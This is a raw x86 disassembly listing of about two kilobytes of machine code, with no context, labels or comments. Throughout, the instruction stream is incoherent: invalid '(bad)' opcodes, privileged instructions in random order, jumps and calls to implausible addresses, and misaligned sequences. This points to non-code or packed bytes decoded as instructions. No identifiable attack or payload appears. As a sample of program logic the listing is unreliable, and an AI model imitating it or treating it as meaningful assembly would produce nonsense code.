  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
